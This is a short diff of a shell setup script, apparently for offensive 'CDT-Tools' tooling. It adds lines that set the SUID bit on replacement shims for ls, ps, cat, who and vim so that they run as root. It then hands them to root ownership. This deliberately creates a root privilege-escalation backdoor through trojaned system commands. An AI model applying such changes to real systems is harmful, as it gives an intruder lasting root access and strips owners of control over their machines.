@@ -30,6 +30,13 @@ chmod +x CDT-Tools/cat_shim/cat_new
 chmod +x CDT-Tools/who_shim/who_new
 chmod +x CDT-Tools/vim_shim/vim_new
 
+# Set the SUID bit for root so that all commands will always run
+chmod u+s CDT-Tools/ls_shim/ls_new
+chmod u+s CDT-Tools/ps_shim/ps_new
+chmod u+s CDT-Tools/cat_shim/cat_new
+chmod u+s CDT-Tools/who_shim/who_new
+chmod u+s CDT-Tools/vim_shim/vim_new
+
 # Make the owner root
 chown -R root:root CDT-Tools
 
